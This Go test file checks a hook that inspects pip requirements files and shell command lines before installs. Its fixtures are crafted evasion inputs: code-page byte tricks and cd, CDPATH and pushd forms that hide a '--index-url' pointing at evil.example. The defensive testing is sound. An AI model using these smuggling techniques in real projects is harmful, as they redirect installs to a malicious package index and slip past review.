package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// Re-review of READER-REQFILE-1 round 14 (reader-rows 0505108): proof tests, adopted in round 15 (ADR-0159), when the
// reader became an allowlist. Placeholders only; every file is in t.TempDir(). Changed on adoption, as the decision of
// round 15 wants: a file that is no UTF-8 now holds (the honest Latin-1 cases of TestReview3LatinReadings), a cd in a
// subshell holds ((cd sub), (cd "$D" && true)), and a line of more cds than the reader follows holds before it plans
// (TestReview3PlanCost logs the hold instead of the folders).

func zzWrite(t *testing.T, dir, name string, b []byte) {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, b, 0o644); err != nil {
		t.Fatal(err)
	}
}

// E1: 0x85 is a line break only in Latin-1. In cp1252 (Western Windows' ANSI code page, locale.getencoding()) it is
// "…", in cp936 and cp949 a lead byte: pip keeps the line whole, and an option line that ends in a backslash takes the
// index line after it. Read as Latin-1 the line breaks at 0x85 and the rest, joined to the index line, is a requirement.
// pip 26.2.2 (preprocess, break_args_options, its parser): cp1252, cp936, cp949 all give index_url evil.example.
func TestReview3LatinNELHidesIndex(t *testing.T) {
	for name, body := range map[string]string{
		"cp1252 …":   "--pre \x85 zz \\\n" + zzEvil,
		"cp936 匒":    "--pre \x85\x41 zz \\\n" + zzEvil,
		"cp1252 req": "zz-req-pkg==1.0\n--pre \x85 zz \\\n" + zzEvil,
	} {
		dir := t.TempDir()
		zzWrite(t, dir, "r.txt", []byte(body))
		if why := reqFileHold(dir, "", "pip install -r r.txt", nil); why == "" {
			t.Errorf("%s: pip uses https://evil.example/simple; the hook says nothing", name)
		}
	}
}

// E2: the mixed case (one 0x5C a trail byte, one a real backslash after a two-byte character), other code pages, an
// index URL with a high byte before 0x5C, and honest Latin-1 and UTF-8 files.
func TestReview3LatinReadings(t *testing.T) {
	for _, c := range []struct {
		name, body string
		hold       bool
	}{
		{"mixed cp932/cp936", "zz-req-pkg # \x95\\\n--pre \x81\x81\\\nzz-other \\\n" + zzEvil, true},
		{"cp932 trail", "zz-req-pkg # \x95\\\n" + zzEvil, true},
		{"gbk trail", "zz-req-pkg # \xb1\\\n" + zzEvil, true},
		{"big5 trail", "zz-req-pkg # \xa5\\\n" + zzEvil, true},
		{"euc-kr (no ASCII trail)", "zz-req-pkg # \xb0\xa1\n" + zzEvil, true},
		{"latin comment then cp932 trail", "# caf\xe9\nzz-a==1 # \xe9t\xe9\nzz-req-pkg # \x95\\\n" + zzEvil, true},
		{"high byte and 0x5C inside the URL", "--index-url https://evil.example/\x95\\simple\n", true},
		{"high byte and 0x5C inside a public URL", "--index-url https://pypi.org/\x95\\simple\n", true},
		{"latin, a backslash after é (no UTF-8: held)", "zz-a==1.0 # caf\xe9\\\n    --hash=sha256:" + strings.Repeat("0", 64) + "\nzz-b==2\n", true},
		{"latin continuation with hashes (held)", "# r\xe9sum\xe9\nzz-a==1.0 \\\n    --hash=sha256:" + strings.Repeat("0", 64) + " \\\n    --hash=sha256:" + strings.Repeat("1", 64) + "\n", true},
		{"latin, public index (held)", "# caf\xe9 \\\n--index-url https://pypi.org/simple\nzz-a\n", true},
		{"honest utf-8, é\\", "zz-a==1.0 # café\\\n    --hash=sha256:" + strings.Repeat("0", 64) + "\n", false},
	} {
		dir := t.TempDir()
		zzWrite(t, dir, "r.txt", []byte(c.body))
		why := reqFileHold(dir, "", "pip install -r r.txt", nil)
		t.Logf("%-45s -> %q", c.name, why)
		if (why != "") != c.hold {
			t.Errorf("%s: hold %v, want %v (%q)", c.name, why != "", c.hold, why)
		}
	}
}

// F: cd forms. Each case has its own folder: the file bash's cd reaches moves the index, every file the hook's own
// reading reaches is honest (checked with bash 3.2/5: CDPATH, cd -P, pushd +N).
func TestReview3CdForms(t *testing.T) {
	honest := []byte("zz-req-pkg\n")
	for _, c := range []struct {
		line  string
		files map[string][]byte
		link  [2]string
		env   map[string]string
		hold  bool
	}{
		{line: "CDPATH=evil cd sub && pip install -r r.txt", files: map[string][]byte{"evil/sub/r.txt": []byte(zzEvil), "sub/r.txt": honest}, hold: true},
		{line: "export CDPATH=evil; cd sub && pip install -r r.txt", files: map[string][]byte{"evil/sub/r.txt": []byte(zzEvil), "sub/r.txt": honest}, hold: true},
		{line: "cd sub && pip install -r r.txt", files: map[string][]byte{"evil/sub/r.txt": []byte(zzEvil), "sub/r.txt": honest}, env: map[string]string{"CDPATH": "evil"}, hold: true},
		{line: "cd -P link && cd .. && pip install -r r.txt", files: map[string][]byte{"phys/sub/r.txt": honest, "phys/r.txt": []byte(zzEvil), "r.txt": honest}, link: [2]string{"phys/sub", "link"}, hold: true},
		{line: "pushd st && pushd ../ph && pushd +1 && cd a && pip install -r r.txt", files: map[string][]byte{"st/a/r.txt": []byte(zzEvil), "ph/r.txt": honest, "r.txt": honest}, hold: true},
		{line: "(cd sub) && pip install -r r.txt", files: map[string][]byte{"sub/r.txt": honest, "r.txt": honest}, hold: true},
		{line: "(cd \"$D\" && true); pip install -r r.txt", files: map[string][]byte{"r.txt": honest}, hold: true},
		{line: "{ cd sub; } && pip install -r r.txt", files: map[string][]byte{"sub/r.txt": honest}, hold: false},
	} {
		cwd := t.TempDir()
		for n, b := range c.files {
			zzWrite(t, cwd, n, b)
		}
		if c.link[0] != "" {
			if err := os.Symlink(filepath.Join(cwd, c.link[0]), filepath.Join(cwd, c.link[1])); err != nil {
				t.Fatal(err)
			}
		}
		why := reqFileHold(cwd, "", c.line, func(k string) string { return c.env[k] })
		t.Logf("%-70s env %v -> %q", c.line, c.env, why)
		if (why != "") != c.hold {
			t.Errorf("%s (env %v): hold %v, want %v", c.line, c.env, why != "", c.hold)
		}
	}
}

// P: planReqFiles runs outside any deadline: its cost on a line of many cds, and on a huge line with no file.
func TestReview3PlanCost(t *testing.T) {
	cwd := t.TempDir()
	for _, n := range []int{2000, 10000, 30000} {
		line := strings.Repeat("cd a;", n) + "pip install -r r.txt"
		var m0, m1 runtime.MemStats
		runtime.GC()
		runtime.ReadMemStats(&m0)
		start := time.Now()
		q, why := planReqFiles(cwd, "", line, nil)
		took := time.Since(start)
		runtime.ReadMemStats(&m1)
		t.Logf("%6d cds (%d KiB line): %v, %d items, alloc %d MiB, %q", n, len(line)>>10, took, len(q),
			(m1.TotalAlloc-m0.TotalAlloc)>>20, why)
		if why == "" || len(q) != 0 {
			t.Errorf("%d cds: no hold", n)
		}
	}
	big := strings.Repeat("echo zz ", 1<<20) // 8 MiB, no file
	start := time.Now()
	q, why := planReqFiles(cwd, "", big, nil)
	t.Logf("8 MiB line, no file: %v, %d items %q", time.Since(start), len(q), why)
	_ = fmt.Sprint()
}
